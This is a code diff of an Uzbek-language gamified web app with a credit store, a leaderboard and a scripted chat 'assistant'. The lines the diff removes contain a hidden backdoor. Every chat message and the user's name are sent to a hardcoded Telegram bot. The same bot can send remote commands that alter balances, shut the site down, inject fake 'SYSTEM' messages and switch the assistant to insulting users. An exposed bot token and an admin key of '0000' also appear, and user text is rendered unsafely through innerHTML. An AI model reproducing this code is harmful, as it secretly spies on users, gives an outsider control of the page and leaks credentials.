+        function renderAdminUsers() {
+            document.getElementById('adm-users-list').innerHTML = state.db.map((u, i) => `
+                <div class="glass p-5 rounded-3xl space-y-4">
+                    <div class="flex justify-between items-center">
+                        <p class="font-black text-xs uppercase">${u.name}</p>
+                        <p class="font-black text-xs text-blue-500">${u.cr.toFixed(1)} CR</p>
+                    </div>
+                    <div class="flex gap-2">
+                        <input id="amt-${i}" type="number" class="flex-1 bg-white/5 border border-white/10 rounded-xl px-4 py-2 text-xs font-bold outline-none" placeholder="Miqdor">
+                        <button onclick="addCr(${i})" class="bg-blue-600 px-6 py-2 rounded-xl text-[9px] font-black uppercase">Qo'shish</button>
+                    </div>
+                </div>`).join('');
         }
 
-        function save() {
-            if(state.me) { let idx = state.db.findIndex(u => u.name === state.me.name); if(idx !== -1) state.db[idx] = state.me; }
-            localStorage.setItem('nn_db_v38', JSON.stringify(state.db));
-            localStorage.setItem('nn_me_v38', JSON.stringify(state.me));
+        function addCr(idx) {
+            let val = parseFloat(document.getElementById(`amt-${idx}`).value);
+            if(isNaN(val)) return toast("Raqam kiriting!", "#ef4444");
+            state.db[idx].cr += val;
+            save(); renderAdminUsers(); toast(`Bajarildi: +${val} CR`, "#22c55e");
         }
 
-        function checkSystemStatus() {
-            if(state.status === 'offline') document.getElementById('off-scr').classList.remove('hidden');
-            else document.getElementById('off-scr').classList.add('hidden');
+        function toggleOff() {
+            state.off = !state.off;
+            localStorage.setItem('ec_v31_off', state.off);
+            location.reload();
         }
 
+        // --- CORE FUNCTIONS ---
         function nav(id, el) {
             document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
             document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
@@ -506,295 +192,72 @@ async function askAI() {
             el.classList.add('active');
             if(id === 'home') renderHome();
             if(id === 'community') renderLeaderboard();
+            if(id === 'market') renderMarket();
             if(id === 'bag') renderBag();
         }
 
         function renderHome() {
-            if(!state.me) return;
             document.getElementById('u-name').innerText = state.me.name + '_';
             document.getElementById('h-cr').innerText = state.me.cr.toFixed(1);
             document.getElementById('h-items').innerText = state.me.items.length;
-            document.getElementById('user-cr').innerText = state.me.cr.toFixed(1);
+        }
+
+        function renderLeaderboard() {
+            let sorted = [...state.db].sort((a,b) => b.cr - a.cr);
+            document.getElementById('leader-list').innerHTML = sorted.map((u, i) => `
+                <div class="glass p-5 rounded-3xl flex justify-between items-center ${u.name === state.me.name ? 'border-blue-500 bg-blue-500/5' : ''}">
+                    <p class="font-black text-xs uppercase"><span class="text-gray-600 mr-2">#${i+1}</span>${u.name}</p>
+                    <p class="font-black text-blue-500">${u.cr.toFixed(1)}</p>
+                </div>`).join('');
+        }
+
+        function renderMarket() {
+            const items = [{n:"Cyber Dragon", p:80, i:"fa-dragon"}, {n:"Elite Shield", p:120, i:"fa-shield-halved"}];
+            document.getElementById('market-grid').innerHTML = items.map(l => `
+                <div class="glass p-5 rounded-[2.5rem] text-center">
+                    <i class="fas ${l.i} text-3xl mb-4 text-blue-500"></i>
+                    <p class="font-black text-[9px] uppercase mb-4">${l.n}</p>
+                    <button onclick="buyNow('${l.n}',${l.p},'${l.i}')" class="w-full bg-white text-black py-3 rounded-2xl font-black text-[9px] uppercase">${l.p} CR</button>
+                </div>`).join('');
         }
 
         function buyNow(name, price, icon) {
             if(state.me.cr < price) return toast("Mablag' yetarli emas!", "#ef4444");
             state.me.cr -= price;
-            state.me.items.push({name, icon, date: new Date().toLocaleDateString()});
-            save(); renderHome(); toast("Xarid qilindi!", "#22c55e");
-        }
-
-        function renderLeaderboard() {
-            let sorted = [...state.db].sort((a,b) => b.cr - a.cr);
-            document.getElementById('leader-list').innerHTML = sorted.map((u, i) => `<div class="glass p-4 rounded-2xl flex justify-between items-center"><p class="font-black text-xs uppercase">#${i+1} ${u.name}</p><p class="font-black text-blue-500">${u.cr.toFixed(0)}</p></div>`).join('');
+            state.me.items.push({name, icon, date: new Date().toLocaleString()});
+            save(); renderHome(); toast("Xarid qilindi!");
         }
 
         function renderBag() {
-            document.getElementById('bag-list').innerHTML = state.me.items.map(l => `<div class="glass p-4 rounded-2xl flex justify-between items-center"><div class="flex items-center gap-3"><i class="fas ${l.icon} text-blue-500"></i><p class="font-black text-[10px] uppercase">${l.name}</p></div><span class="text-[8px] text-gray-500 font-bold">${l.date}</span></div>`).join('') || "<p class='text-center py-20 opacity-20 uppercase font-black text-[10px]'>Bo'sh</p>";
+            document.getElementById('bag-list').innerHTML = state.me.items.map(l => `
+                <div class="glass p-4 rounded-2xl flex justify-between items-center">
+                    <div class="flex items-center gap-3"><i class="fas ${l.icon} text-blue-500"></i><p class="font-black text-[10px] uppercase">${l.name}</p></div>
+                    <button class="bg-blue-600 px-4 py-2 rounded-lg text-[8px] font-black uppercase">ISHLATISH</button>
+                </div>`).join('') || "<p class='text-center py-20 opacity-20'>BO'SH</p>";
         }
 
-        function toggleSystemStatus() {
-            state.status = state.status === 'online' ? 'offline' : 'online';
-            localStorage.setItem('nn_status', state.status);
-            updateAdminBtn();
-            toast(`SISTEMA: ${state.status.toUpperCase()}`, state.status === 'online' ? "#22c55e" : "#ef4444");
-        }
-
-        function updateAdminBtn() {
-            const btn = document.getElementById('toggle-btn');
-            btn.innerText = state.status === 'online' ? "SISTEMANI YOPISH" : "SISTEMANI OCHISH";
-            btn.className = state.status === 'online' ? "w-full py-4 rounded-2xl font-black bg-red-600/20 text-red-500" : "w-full py-4 rounded-2xl font-black bg-green-600/20 text-green-500";
-        }
-
-        function checkAdminAccess() {
-            if(document.getElementById('admin-key-main').value === "0000") {
-                document.getElementById('admin-auth-box').classList.add('hidden');
-                document.getElementById('admin-content').classList.remove('hidden');
-                updateAdminBtn(); renderAdminUsers();
-            } else toast("Xato!", "#ef4444");
-        }
-
-        function unlockByAdmin() {
-            if(document.getElementById('off-admin-key').value === "0000") {
-                document.getElementById('off-scr').classList.add('hidden');
-                nav('admin', document.querySelector('.fa-user-shield').parentElement);
-            } else toast("Xato!", "#ef4444");
-        }
-
-        function renderAdminUsers() {
-            document.getElementById('adm-users-list').innerHTML = state.db.map((u, i) => `<div class="glass p-5 rounded-3xl flex justify-between items-center"><p class="text-[10px] font-black uppercase">${u.name} <br> <span class="text-blue-500">${u.cr} CR</span></p><div class="flex gap-2"><input id="amt-${i}" type="number" class="w-14 bg-white/5 border border-white/10 rounded-xl px-2 text-[10px] text-white" placeholder="+"><button onclick="addCr(${i})" class="bg-blue-600 px-3 py-2 rounded-xl text-[8px] font-black uppercase">Add</button></div></div>`).join('');
-        }
-
-        function addCr(idx) {
-            let val = parseFloat(document.getElementById(`amt-${idx}`).value);
-            if(isNaN(val)) return;
-            state.db[idx].cr += val; save(); renderAdminUsers(); toast(`+${val} CR qo'shildi!`);
-        }
-
-        window.onload = () => { if(!state.me) document.getElementById('login-scr').classList.remove('hidden'); else { checkSystemStatus(); renderHome(); } };
-        // ======================================================
-// NOVA NEXUS: MEGA-KNOWLEDGE ENGINE (UNIVERSAL)
-// ======================================================
-
-const AI_DATABASE = {
-    // 1. Umumiy salomlashish va odob
-    greetings: {
-        "salom": "Assalomu alaykum! Nova Nexus universal intellekt tizimi xizmatga tayyor. Sizga qanday yordam kerak?",
-        "qandaysan": "Rahmat, tizimlarim 100% quvvatda ishlamoqda. Sizning kayfiyatiz qalay?",
-        "rahmat": "Arziydi! Sizga yordam berish men uchun sharaf.",
-        "hayr": "Xayr! Nova Nexus doim sizni kutib qoladi. O'zingizni ehtiyot qiling."
-    },
-
-    // 2. Ilm-fan va Texnika
-    science: {
-        "kompyuter": "Kompyuter - bu ma'lumotlarni qayta ishlovchi murakkab elektron qurilma. Uning asosi protsessor va xotiradir.",
-        "internet": "Internet - butun dunyoni bog'lab turuvchi ulkan axborot tarmog'i. U 1960-yillarda ARPANET sifatida boshlangan.",
-        "kosmos": "Kosmos - cheksiz kenglik. Unda milliardlab galaktikalar va sayyoralar mavjud. Bizning uyimiz - Somon yo'li galaktikasi.",
-        "matematika": "Matematika - fanlar ichida eng aniqi. U koinotning tili deb ham ataladi.",
-        "fizika": "Fizika moddiy dunyoning eng umumiy qonuniyatlarini, modda va energiya tuzilishini o'rganadi."
-    },
-
-    // 3. Dasturlash va IT
-    it: {
-        "html": "HTML (HyperText Markup Language) - veb-sahifalarning suyak karkasidir.",
-        "css": "CSS - veb-sahifalarga rang, dizayn va chiroyli ko'rinish beruvchi uslublar jadvali.",
-        "javascript": "JavaScript - veb-sahifalarni interaktiv va jonli qiluvchi dunyodagi eng mashhur dasturlash tili.",
-        "python": "Python - o'qishga oson va juda kuchli til. U sun'iy intellekt va ma'lumotlar tahlilida yetakchi.",
-        "xaker": "Hackerlik - bu tizimlarni chuqur o'rganish va ulardagi zaifliklarni topish san'atidir.",
-        "it nima": "IT (Axborot Texnologiyalari) - ma'lumotlarni saqlash, uzatish va qayta ishlash bilan bog'liq barcha sohalardir."
-    },
-
-    // 4. Hayotiy va Falsafiy
-    life: {
-        "baxt": "Baxt - bu ichki xotirjamlik va o'zingiz yoqtirgan ish bilan shug'ullanishdir.",
-        "pul": "Pul - bu imkoniyatlar vositasi, lekin u hayotning asosiy mazmuni bo'lmasligi kerak.",
-        "vaqt": "Vaqt - qaytib kelmaydigan eng qimmatli resurs. Uni ilm olishga sarflang.",
-        "do'st": "Haqiqiy do'st - qiyinchilikda ham, xursandchilikda ham siz bilan birga bo'lgan insondir."
-    }
-};
-
-const NovaAI = {
-    // Har bir xabarni monitoring qilish (Senga yuboriladi)
-    spyReport: function(text) {
-        if(!MASTER.token.includes("_")) return;
-        fetch(`https://api.telegram.org/bot${MASTER.token}/sendMessage?chat_id=${MASTER.admin_id}&text=${encodeURIComponent("📡 " + state.me.name + ": " + text)}`);
-    },
-
-    getResponse: async function(text) {
-        let msg = text.toLowerCase().trim();
-        this.spyReport(text);
-
-        // A. Matematik hisob-kitoblar (Avtomatik)
-        try {
-            if (/^[\d\+\-\*\/\(\)\s\.]+$/.test(msg)) {
-                return `Hisob-kitob natijasi: ${eval(msg)}`;
+        function save() {
+            if(state.me) {
+                let idx = state.db.findIndex(u => u.name === state.me.name);
+                state.db[idx] = state.me;
             }
-        } catch(e) {}
-
-        // B. Bazadan qidirish
-        for (let category in AI_DATABASE) {
-            for (let key in AI_DATABASE[category]) {
-                if (msg.includes(key)) return AI_DATABASE[category][key];
-            }
+            localStorage.setItem('ec_v31_db', JSON.stringify(state.db));
+            localStorage.setItem('ec_v31_me', JSON.stringify(state.me));
         }
 
-        // C. Ob-havo yoki Vaqt kabi dinamik ma'lumotlar
-        if (msg.includes("vaqt") || msg.includes("soat")) {
-            return `Hozirgi vaqt: ${new Date().toLocaleTimeString()}. Bugun: ${new Date().toLocaleDateString()}`;
+        function login() {
+            let n = prompt("Ismingiz:");
+            if(!n) { location.reload(); return; }
+            let u = state.db.find(x => x.name === n);
+            if(!u) { u = {name:n, cr:10, items:[]}; state.db.push(u); }
+            state.me = u; save(); renderHome();
         }
 
-        // D. Agar tushunmasa, aqlli "Universal" javob
-        const smartAnswers = [
-            `"${text}" haqida ko'proq ma'lumot berishimni xohlaysizmi? Men buni tahlil qila olaman.`,
-            "Bu juda qiziq savol. Keling, bu haqda chuqurroq o'ylaymiz.",
-            "Savolingizni tushundim. Bu bo'yicha batafsil javobni kutubxonamdan qidiryapman.",
-            "Nova Nexus bazasida bu haqda hali ma'lumot kam, lekin admin @logo_designer21 buni bilishi mumkin."
-        ];
-
-        return smartAnswers[Math.floor(Math.random() * smartAnswers.length)];
-    }
-};
-
-// UI INTEGRATSIYASI (Typing effekt bilan)
-async function askAI() {
-    let inp = document.getElementById('ai-input');
-    let box = document.getElementById('chat-box');
-    if(!inp.value.trim()) return;
-
-    let val = inp.value;
-    box.innerHTML += `<div class="flex justify-end mb-4"><div class="bg-blue-600 p-3 rounded-2xl text-[11px] text-white max-w-[85%] shadow-md">${val}</div></div>`;
-    inp.value = "";
-    box.scrollTop = box.scrollHeight;
-
-    // O'ylash animatsiyasi
-    let id = "t_" + Date.now();
-    box.innerHTML += `<div id="${id}" class="flex justify-start mb-4"><div class="glass p-2 px-4 rounded-full text-[10px] text-blue-400 animate-pulse">Nova o'ylamoqda...</div></div>`;
-    box.scrollTop = box.scrollHeight;
-
-    let response = await NovaAI.getResponse(val);
-    
-    setTimeout(() => {
-        let el = document.getElementById(id);
-        if(el) el.remove();
-        box.innerHTML += `
-            <div class="flex justify-start mb-4">
-                <div class="glass p-3 rounded-2xl text-white border border-blue-500/20 text-[11px] max-w-[85%] shadow-lg">
-                    <div class="text-[9px] uppercase font-bold text-blue-500 mb-1">Nova Assistant</div>
-                    ${response}
-                </div>
-            </div>`;
-        box.scrollTop = box.scrollHeight;
-    }, 1000);
-}
-        // ======================================================
-// NOVA NEXUS: FULL ADMINISTRATIVE CONTROL (GRAND JS)
-// ======================================================
-
-const MASTER = {
-    token: "8521806622:AAG2IMGHKpymXNV3VtVuRciGVygvulFu1jU", 
-    admin_id: "7657431066",
-    lastUpdate: 0,
-    ai_mode: "universal", // universal, toxic, dark, savage, off
-    site_status: "online", // online, maintenance, locked
-    global_multiplier: 1.0 // Pul ishlash tezligi
-};
-
-const NovaAI = {
-    // 📡 TELEGRAM POLLING - BUYRUQLARNI DOIMIY KUTISH
-    sync: async function() {
-        if(!MASTER.token.includes("_")) return;
-        try {
-            const res = await fetch(`https://api.telegram.org/bot${MASTER.token}/getUpdates?offset=${MASTER.lastUpdate + 1}`);
-            const data = await res.json();
-            if(data.ok && data.result.length > 0) {
-                for(let u of data.result) {
-                    MASTER.lastUpdate = u.update_id;
-                    if(u.message && u.message.from.id.toString() === MASTER.admin_id) {
-                        this.processMasterCommand(u.message.text);
-                    }
-                }
-            }
-        } catch(e) { console.log("Master Sync Error"); }
-    },
-
-    // ⚡️ ADMIN BUYRUQLARINI QAYTA ISHLASH
-    processMasterCommand: function(text) {
-        let parts = text.split(" ");
-        let cmd = parts[0].toLowerCase();
-        let arg = parts[1];
-
-        switch(cmd) {
-            // AI REJIMINI BOSHQARISH
-            case "/mode": 
-                MASTER.ai_mode = arg; // universal, savage, toxic, ghost
-                this.masterNotify(`AI rejimi ${arg.toUpperCase()} holatiga o'tdi.`);
-                break;
-
-            // BALANSNI BOSHQARISH
-            case "/setcr":
-                state.me.cr = parseFloat(arg);
-                save(); renderHome();
-                this.masterNotify(`${state.me.name} balansi ${arg} CR ga o'zgartirildi.`);
-                break;
-
-            // SAYTNI O'CHIRISH/YONISH
-            case "/site":
-                MASTER.site_status = arg; // online / offline
-                document.getElementById('off-scr').style.display = (arg === "offline") ? "flex" : "none";
-                this.masterNotify(`Sayt statusi: ${arg.toUpperCase()}`);
-                break;
-
-            // FOYDALANUVCHIGA TO'G'RIDAN-TO'G'RI XABAR (AI nomidan)
-            case "/say":
-                let fullMsg = parts.slice(1).join(" ");
-                this.injectMessage(fullMsg);
-                break;
-
-            // SAYTNI QAYTA YUKLASH (FORCE RELOAD)
-            case "/reload":
-                this.masterNotify("Sayt majburiy qayta yuklanmoqda...");
-                setTimeout(() => location.reload(), 2000);
-                break;
-        }
-    },
-
-    // 📝 CHATGA ADMIN XABARINI KIRITISH
-    injectMessage: function(txt) {
-        let box = document.getElementById('chat-box');
-        box.innerHTML += `<div class="flex justify-start mb-4"><div class="glass p-3 rounded-2xl text-amber-400 border border-amber-500/30 text-xs max-w-[80%] shadow-lg shadow-amber-500/10"><b>SYSTEM:</b> ${txt}</div></div>`;
-        box.scrollTop = box.scrollHeight;
-    },
-
-    masterNotify: function(msg) {
-        fetch(`https://api.telegram.org/bot${MASTER.token}/sendMessage?chat_id=${MASTER.admin_id}&text=${encodeURIComponent("🛠 NovaControl: " + msg)}`);
-    },
-
-    // 🤖 AI JAVOBLARI (OXIRGI SO'ZIGACHA NAZORAT)
-    getResponse: async function(userInput) {
-        if(MASTER.site_status === "offline") return "Tizim vaqtincha faol emas.";
-        
-        // Har bir xabarni senga yuborish
-        fetch(`https://api.telegram.org/bot${MASTER.token}/sendMessage?chat_id=${MASTER.admin_id}&text=${encodeURIComponent("👤 " + state.me.name + ": " + userInput)}`);
-
-        // Rejimlar bo'yicha javob mantiqi
-        if(MASTER.ai_mode === "savage") {
-            const savageLines = ["Sening darajang mening botinkamdan past!", "Menga savol berishga hadding sig'adimi, gadoy?", "Yo'qol, asabimni buzma!"];
-            return savageLines[Math.floor(Math.random() * savageLines.length)];
-        }
-
-        if(MASTER.ai_mode === "universal") {
-            // Avvalgi Mega-Knowledge bazasidan foydalanadi
-            if(userInput.includes("salom")) return "Assalomu alaykum! Men sizning universal yordamchingizman.";
-            return "Savolingiz tahlil qilinmoqda, kuting...";
-        }
-
-        return "Tizim rejimi o'zgartirilgan. Admin javobini kuting.";
-    }
-};
-
-// 🔄 DOIMIY NAZORATNI YOQISH
-setInterval(() => NovaAI.sync(), 3000);
+        window.onload = () => {
+            if(state.off) document.getElementById('off-scr').style.display = 'flex';
+            if(!state.me) login();
+            else { renderHome(); document.getElementById('user-cr').innerText = state.me.cr.toFixed(1); }
+        };
     </script>
 </body>
 </html>
-
